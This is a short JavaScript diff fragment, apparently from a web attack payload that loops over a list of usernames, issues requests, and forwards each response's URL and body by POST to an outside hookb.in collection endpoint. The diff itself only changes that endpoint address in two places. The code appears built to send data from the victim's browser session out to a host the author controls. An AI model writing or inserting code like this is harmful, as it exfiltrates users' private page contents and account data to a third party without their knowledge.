@@ -20,7 +20,7 @@ for (u in unames) {
 
         http.onload = function () {
             let xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
+            xhr.open('POST', 'https://hookb.in/1gdxlYb2j6sd6NOOxnDq', true);
             xhr.setRequestHeader('Content-type', 'application/json');
             xhr.send(JSON.stringify(http.responseURL));
         };
@@ -33,7 +33,7 @@ for (u in unames) {
                     req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                     req.onload = function () {
                         let r = new XMLHttpRequest();
-                        r.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
+                        r.open('POST', 'https://hookb.in/1gdxlYb2j6sd6NOOxnDq', true);
                         r.setRequestHeader('Content-type', 'application/json');
                         r.send(JSON.stringify(http.responseText));
                     };
